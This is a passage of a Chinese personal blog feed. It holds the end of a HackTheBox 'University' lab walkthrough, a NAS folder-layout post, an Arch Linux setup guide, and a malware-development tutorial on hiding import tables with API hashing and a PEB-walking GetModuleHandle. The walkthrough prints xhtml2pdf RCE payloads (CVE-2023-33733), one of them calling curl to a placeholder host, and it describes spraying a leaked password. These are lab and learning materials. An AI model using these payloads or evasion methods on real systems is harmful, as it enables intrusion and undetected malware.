class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49672/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49697/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">59453/tcp open  msrpc         Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="Shell-as-User-wao"><a href="#Shell-as-User-wao" class="headerlink" title="Shell as User - wao"></a>Shell as User - wao</h2><h3 id="Tcp-80"><a href="#Tcp-80" class="headerlink" title="Tcp-80"></a>Tcp-80</h3><img src="/2024/11/07/HTB-University/image-20241108153412658.png" class=""><p>注册一个用户，第一时间尝试注册教师用户，登陆失败，所以注册一个学生用户。</p><img src="/2024/11/07/HTB-University/image-20241111093007862.png" class=""><p>发现一个把个人信息导出为 PDF 的功能</p><img src="/2024/11/07/HTB-University/image-20241108154113477.png" class=""><p>查看属性可以了解到用的 xhtml2pdf 组件。通过搜索引擎找到了一个 RCE 漏洞 CVE-2023-33733。</p><blockquote><p><a href="https://github.com/c53elyas/CVE-2023-33733">https://github.com/c53elyas/CVE-2023-33733</a></p></blockquote><p>这个 Github 仓库是用来测试 POC 的，运行 poc.py 相当于运行 payload，RCE 的部分在 system 中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[ [ getattr(pow,Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;curl http://xxx.xxx.xxx.xxx/&#x27;) for Word in [orgTypeFun(&#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: False, &#x27;__eq__&#x27;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123;setattr(self, &#x27;mutated&#x27;, self.mutated - 1)&#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)) &#125;)] ] for orgTypeFun in [type(type(1))] ] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br><span class="line">exploit</span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">para</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/07/HTB-University/image-20241108155903169.png" class=""><p>这个 POC 测了几次都失败了，看到仓库下方还有另一种方案</p><img src="/2024/11/07/HTB-University/image-20241108160953473.png" class=""><p>这个是从 HTML 转化为 PDF 时 RCE 的 Payload，比较符合这个环境。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;touch /tmp/exploited&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br><span class="line">                exploit</span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">para</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/07/HTB-University/image-20241111111938659.png" class=""><p>更新信息后，变成这个样子，说明各个标签都正常解析了，才能正常执行。</p><img src="/2024/11/07/HTB-University/image-20241111112046204.png" class=""><h3 id="Enum-1"><a href="#Enum-1" class="headerlink" title="Enum"></a>Enum</h3><img src="/2024/11/07/HTB-University/image-20241111112805946.png" class=""><p>发现一个备份目录</p><img src="/2024/11/07/HTB-University/image-20241111112830931.png" class=""><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sourcePath</span> = <span class="string">&quot;C:\Web\University\db.sqlite3&quot;</span></span><br><span class="line"><span class="variable">$destinationPath</span> = <span class="string">&quot;C:\Web\DB Backups\&quot;</span></span><br><span class="line"><span class="variable">$7zExePath</span> = <span class="string">&quot;C:\Program Files\7-Zip\7z.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$zipFileName</span> = <span class="string">&quot;DB-Backup-<span class="variable">$</span>(Get-Date -Format &#x27;yyyy-MM-dd&#x27;).zip&quot;</span></span><br><span class="line"><span class="variable">$zipFilePath</span> = <span class="built_in">Join-Path</span> <span class="literal">-Path</span> <span class="variable">$destinationPath</span> <span class="literal">-ChildPath</span> <span class="variable">$zipFileName</span></span><br><span class="line"><span class="variable">$7zCommand</span> = <span class="string">&quot;&amp; `&quot;<span class="variable">$7zExePath</span>`&quot; a `&quot;<span class="variable">$zipFilePath</span>`&quot; `&quot;<span class="variable">$sourcePath</span>`&quot; -p&#x27;WebAO1337&#x27;&quot;</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> <span class="literal">-Command</span> <span class="variable">$7zCommand</span></span><br></pre></td></tr></table></figure><p>这里可以看到备份文件的密码，这里可以喷射一下，先拿到所有域用户。</p><img src="/2024/11/07/HTB-University/image-20241111150118392.png" class=""><img src="/2024/11/07/HTB-University/image-20241111155927019.png" class=""><p>拿到了 wao 用户的密码，再遛一下狗子</p><img src="/2024/11/07/HTB-University/image-20241111160135052.png" class=""><p>可以看到 wao 没什么特殊的权限，不过他是在 WEB DEVELOPERS 组中</p><h2 id="Shell-as-User"><a href="#Shell-as-User" class="headerlink" title="Shell as User &#x3D;"></a>Shell as User &#x3D;</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/2024/11/07/HTB-University/University.png&quot; class=&quot;&quot;&gt;

&lt;h2 id=&quot;Enum&quot;&gt;&lt;a href=&quot;#Enum&quot; class=&quot;headerlink&quot; title=&quot;Enum&quot;&gt;&lt;/a&gt;Enum&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="Windows" scheme="http://fermionorz.github.io/categories/Windows/"/>
    
    <category term="Insane" scheme="http://fermionorz.github.io/categories/Windows/Insane/"/>
    
    
  </entry>
  
  <entry>
    <title>家用存储解决方案</title>
    <link href="http://fermionorz.github.io/2024/11/01/%E5%AE%B6%E7%94%A8%E5%AD%98%E5%82%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://fermionorz.github.io/2024/11/01/%E5%AE%B6%E7%94%A8%E5%AD%98%E5%82%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2024-11-01T16:00:00.000Z</published>
    <updated>2024-11-18T12:30:51.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><table><thead><tr><th>类别</th><th>选择</th></tr></thead><tbody><tr><td>硬件</td><td>群晖 423+</td></tr><tr><td>系统</td><td>群晖 DSM</td></tr><tr><td>存储方案</td><td>Johnny.Decimal</td></tr></tbody></table><h2 id="Johnny-Decimal-分类法存储"><a href="#Johnny-Decimal-分类法存储" class="headerlink" title="Johnny.Decimal 分类法存储"></a>Johnny.Decimal 分类法存储</h2><blockquote><p><a href="https://johnnydecimal.com/">https://johnnydecimal.com/</a></p></blockquote><ul><li><p>00-09 Personal</p><ul><li>00 Information<ul><li>00.00 简历1</li><li>00.01 简历2</li><li>00.10 身份证</li><li>00.20 头像</li><li>00.31 证书1</li><li>00.32 证书2</li><li>壁纸</li><li>Offer</li></ul></li><li>01 Blog</li><li>09 ProgramData<ul><li>09.01 QQ</li><li>09.02 微信</li><li>…</li></ul></li></ul></li><li><p>10-19 Work</p><ul><li>10 其他工作</li><li>11 第一个公司</li><li>12 第二个公司</li></ul></li><li><p>20-29 Wiki</p><ul><li>20 …</li><li>21 Operation</li><li>22 Security</li><li>23 Hardware</li><li>24 Coding</li><li>25 Game</li><li>…</li></ul></li><li><p>30-39 Document</p><ul><li>31 Operation</li><li>32 Security</li><li>33 Hardware</li><li>34 Coding</li><li>35 Game</li><li>…</li></ul></li><li><p>40-49 Media</p><ul><li>41 Music<ul><li>41.01 周杰伦</li><li>…</li></ul></li><li>…</li></ul></li><li><p>50-59 PRepo</p><ul><li>51 C-Family</li><li>52 Rust</li><li>53 Python</li><li>…</li></ul></li><li><p>60-69 Books</p><ul><li>61 Operation</li><li>62 Security</li><li>…</li></ul></li><li><p>70-79 Downloads</p><ul><li>71 Browser</li><li>72 BaiduCloudDisk</li><li>73 QQ</li><li>…</li></ul></li><li><p>80-89 Resources</p><ul><li>85 WPrograms<ul><li>85.00 WinGet_List.txt</li><li>85.01 Hashcat</li></ul></li><li>89 Virtual Machines<ul><li>89.01 Test Windows 11 LTSC</li><li>89.02 Coding Ubuntu 24.04.01</li><li>…</li><li>89.98 导出的虚拟机</li><li>89.99 操作系统镜像</li></ul></li></ul></li><li><p>90-99 Archive</p><ul><li>90 实时同步数据<ul><li>00-09 Personal</li><li>20-29 Wiki</li></ul></li><li>91</li><li>…</li><li>99 冷备数据<ul><li>20241030 微信聊天记录.7z</li><li>20241030 QQ-聊天记录.7z</li><li>2022-2023 第一家公司.7z</li><li>…</li></ul></li></ul></li></ul><h3 id="分类说明"><a href="#分类说明" class="headerlink" title="分类说明"></a>分类说明</h3><table><thead><tr><th>类别</th><th>说明</th></tr></thead><tbody><tr><td>00 Information</td><td>低频变化的常用信息</td></tr><tr><td>11 第一个公司</td><td>公司有关文件不论类型一律放在此处</td></tr><tr><td>20-29 Wiki</td><td>可以根据个人喜好，建立 Wiki 文档</td></tr><tr><td>30-39 Document</td><td>内部分类可以与 Wiki 一致，存放整理好的文档</td></tr><tr><td>…</td><td>…</td></tr><tr><td>50-59 PRepo</td><td>各语言代码仓库</td></tr><tr><td>60-69 Books</td><td>存放 PDF 等格式电子书，二级类别可以与 Wiki 一致</td></tr><tr><td>70-79 Downloads</td><td>存放各渠道下载文件</td></tr><tr><td>80-89 Resources</td><td>各类资源文件</td></tr><tr><td>90-99 Archive</td><td>存放归档好的文件，给定期备份操作做准备</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概览&quot;&gt;&lt;a href=&quot;#概览&quot; class=&quot;headerlink&quot; title=&quot;概览&quot;&gt;&lt;/a&gt;概览&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类别&lt;/th&gt;
&lt;th&gt;选择&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;</summary>
      
    
    
    
    
    <category term="存储" scheme="http://fermionorz.github.io/tags/%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>PC Linux 解决方案</title>
    <link href="http://fermionorz.github.io/2024/10/29/PC%20Linux%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://fermionorz.github.io/2024/10/29/PC%20Linux%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2024-10-29T16:00:00.000Z</published>
    <updated>2024-11-18T12:30:51.283Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><table><thead><tr><th>类别</th><th>选项</th></tr></thead><tbody><tr><td>发行版</td><td>Arch Linux</td></tr><tr><td>字体</td><td>JetBrains Mono</td></tr><tr><td>桌面环境</td><td>i3-wm</td></tr><tr><td>锁屏</td><td>i3lock</td></tr><tr><td>状态栏</td><td>i3blocks、i3status</td></tr><tr><td>终端模拟器</td><td>alacritty、kitty</td></tr><tr><td>软件启动器</td><td>rofi、wofi</td></tr><tr><td>Web 浏览器</td><td>Firefox、Minbrowser</td></tr><tr><td>媒体播放器</td><td>VLC、mpv</td></tr><tr><td>媒体编辑器</td><td>Blender、GIMP、Inkscape、Audacity、ImageMagick</td></tr><tr><td>安全软件</td><td>VeraCrypt、Bitwarden、</td></tr></tbody></table><h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><p>加载镜像后运行 <code>archinstall</code> 无脑安装即可。建议安装时顺带添加的软件包:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neovim tmux git bash-completion openssl-1.1 </span><br></pre></td></tr></table></figure><p>启动后更新系统 <code>sudo pacman -Syyu</code>，然后安装 aur 包管理器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S base-devel proxychains-ng gnu-free-fonts ttf-jetbrains-mono ttf-jetbrains-mono-nerd</span><br><span class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/paru.git</span><br><span class="line"><span class="built_in">cd</span> paru</span><br><span class="line">makepkg -si</span><br></pre></td></tr></table></figure><h3 id="配置清单"><a href="#配置清单" class="headerlink" title="配置清单"></a>配置清单</h3><h2 id="桌面环境"><a href="#桌面环境" class="headerlink" title="桌面环境"></a>桌面环境</h2><ul><li>安装 i3、xorg、alacritty、rofi、firefox</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S xorg xorg-xinit i3 feh alacritty rofi firefox firefox-developer-edition-i18n-zh-cn noto-fonts noto-fonts-cjk  noto-fonts-emoji  noto-fonts-extra</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概览&quot;&gt;&lt;a href=&quot;#概览&quot; class=&quot;headerlink&quot; title=&quot;概览&quot;&gt;&lt;/a&gt;概览&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类别&lt;/th&gt;
&lt;th&gt;选项&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;</summary>
      
    
    
    
    
    <category term="Linux" scheme="http://fermionorz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Windows Maldev - ITA 隐藏与混淆</title>
    <link href="http://fermionorz.github.io/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/"/>
    <id>http://fermionorz.github.io/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/</id>
    <published>2024-10-23T16:00:00.000Z</published>
    <updated>2024-11-18T12:30:51.283Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ITA(Import Table Address) 包含有关 PE 文件的信息，例如使用的函数名以及 DLL，此类信息常用于对二进制文件进行标记和检测。例如：</p><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241024083658530.png" class=""><p>可以看到，这个 PE 文件导入了 <code>CreateRemoteThread</code>、<code>OpenProcess</code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code> 等函数，Shellcode 加载流程尽收眼底。</p><p>想要隐藏这些内容，可以使用 <code>GetProcAddress</code>、<code>GetModuleHandle</code> 或 <code>LoadLibrary</code> 在运行时动态加载这些函数。</p><p>但这又会出现其他问题。</p><ul><li>动态导入的函数相关字符串会出现在 PE 文件中，这个可以用于签名检测</li><li><code>GetProcAddress</code> 和 <code>GetModuleHandle</code> 函数的导入信息也会出现在 ITA 中</li></ul><p>想隐藏字符串，那只能通过替换，可以通过字符串加密、Hash 运算等方法；对于 <code>GetProcAddress</code> 和 <code>GetModuleHandle</code> 函数的信息，可以通过自实现来隐藏。两者结合。</p><h2 id="Hash-函数"><a href="#Hash-函数" class="headerlink" title="Hash 函数"></a>Hash 函数</h2><p>Hash 函数的选择，最好是能够轻量实现，并且分布均匀（以防冲突），这里的 Demo 选用 <code>JenkinsOneAtATime32Bit</code> 算法，实现来自 <a href="https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringJenkinsOneAtATime32Bit.cpp">VX-API GitHub 仓库</a>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))</span></span><br><span class="line">UINT32 <span class="title function_">HashStringJenkinsOneAtATime32BitA</span><span class="params">(_In_ PCHAR String)</span></span><br><span class="line">&#123;</span><br><span class="line">SIZE_T Index = <span class="number">0</span>;</span><br><span class="line">UINT32 Hash = <span class="number">0</span>;</span><br><span class="line">SIZE_T Length = <span class="built_in">strlen</span>(String);</span><br><span class="line"><span class="keyword">while</span> (Index != Length)</span><br><span class="line">&#123;</span><br><span class="line">Hash += String[Index++];</span><br><span class="line">Hash += Hash &lt;&lt; <span class="number">7</span>; <span class="comment">// 这里的种子可以更改</span></span><br><span class="line">Hash ^= Hash &gt;&gt; <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line">Hash += Hash &lt;&lt; <span class="number">3</span>;</span><br><span class="line">Hash ^= Hash &gt;&gt; <span class="number">11</span>;</span><br><span class="line">Hash += Hash &lt;&lt; <span class="number">15</span>;</span><br><span class="line"><span class="keyword">return</span> Hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了灵活和方便使用，设置了 <code>HASHA</code> 宏。</p><h2 id="实现-GetModuleHandle"><a href="#实现-GetModuleHandle" class="headerlink" title="实现 GetModuleHandle"></a>实现 GetModuleHandle</h2><p><code>GetModuleHandle</code> 函数用于在内存中检索指定 DLL 的句柄。函数返回 DLL 的句柄 (<code>HMODULE</code>) 或 <code>NULL</code> 。</p><h3 id="GetModuleHandle-原理"><a href="#GetModuleHandle-原理" class="headerlink" title="GetModuleHandle 原理"></a>GetModuleHandle 原理</h3><p><code>HMODULE</code> 数据类型是加载的 DLL 的基地址，表示 DLL 在进程地址空间中的位置。因此，替换函数的目标是检索指定 DLL 的基地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">  BYTE                          Reserved1[<span class="number">2</span>];</span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line">  BYTE                          Reserved2[<span class="number">1</span>];</span><br><span class="line">  PVOID                         Reserved3[<span class="number">2</span>];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr; <span class="comment">// 该结构包含关于进程加载模块的信息。</span></span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  PVOID                         Reserved4[<span class="number">3</span>];</span><br><span class="line">  PVOID                         AtlThunkSListPtr;</span><br><span class="line">  PVOID                         Reserved5;</span><br><span class="line">  ULONG                         Reserved6;</span><br><span class="line">  PVOID                         Reserved7;</span><br><span class="line">  ULONG                         Reserved8;</span><br><span class="line">  ULONG                         AtlThunkSListPtr32;</span><br><span class="line">  PVOID                         Reserved9[<span class="number">45</span>];</span><br><span class="line">  BYTE                          Reserved10[<span class="number">96</span>];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved11[<span class="number">128</span>];</span><br><span class="line">  PVOID                         Reserved12[<span class="number">1</span>];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><p>PEB 结构的 <code>PEB_LDR_DATA Ldr</code> 成员包含进程中加载的 DLL 的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA &#123;</span><br><span class="line">  BYTE       Reserved1[8];</span><br><span class="line">  PVOID      Reserved2[3];</span><br><span class="line">  LIST_ENTRY InMemoryOrderModuleList;  // 内存中模块列表</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>对应 <code>LIST_ENTRY</code> 结构是一个双向链表，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025085631337.png" class=""><p>微软文档中说明，<code>_PEB_LDR_DATA</code> 的 InMemeoryOrderModuleList 成员包含进程加载模块的双向链表的头部。列表中的每个项都是指向 LDR_DATA_TABLE_ENTRY 结构的指针。并且给出了 <code>_LDR_DATA_TABLE_ENTRY</code> 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    PVOID Reserved1[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserved2[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;     <span class="comment">// DLL 基地址</span></span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    UNICODE_STRING FullDllName;  <span class="comment">// 已加载 DLL 模块的文件名</span></span><br><span class="line">    BYTE Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>因此，需要关注的两个重点变量已经找到</p><ul><li>DLL 基地址: PEB -&gt; Ldr -&gt; InMemoryOrderModuleList -&gt; Flink -&gt; DllBase （这个其实不是）</li><li>DLL 文件名: PEB -&gt; Ldr -&gt; InMemoryOrderModuleList -&gt; Flink -&gt; FullDllName</li></ul><h3 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HMODULE <span class="title function_">Yes_GetModuleHandle</span><span class="params">(IN LPCWSTR szModuleName)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 peb</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64 <span class="comment">// 如果编译为 x64</span></span></span><br><span class="line">PPEB            pPeb = (PEB*)(__readgsqword(<span class="number">0x60</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _WIN32 <span class="comment">// 如果编译为 x32</span></span></span><br><span class="line">PPEB            pPeb = (PEB*)(__readfsdword(<span class="number">0x30</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 获取 Ldr</span></span><br><span class="line">PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);</span><br><span class="line"><span class="comment">// 获取链表中的第一个元素，其中包含第一个模块的信息 </span></span><br><span class="line">PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pDte-&gt;FullDllName.Length != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Found Dll %-15ls DLLBase: 0x%p Reserved2[0]: 0x%p \n&quot;</span>, pDte-&gt;FullDllName.Buffer, pDte-&gt;DllBase, pDte-&gt;Reserved2[<span class="number">0</span>]);</span><br><span class="line">        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">GetModuleHandleH(<span class="string">&quot;&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025093521044.png" class=""><p>对比 Process Hacker 打开的进程信息</p><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025093502653.png" class=""><p>发现 <code>pDte-&gt;Reserved2[0]</code> 成员是需要的 DLL 基地址。</p><p>现在枚举 DLL 文件名，通过 Hash 校验来确定目标 DLL 基地址。可以实现对函数名进行 Hash 计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> 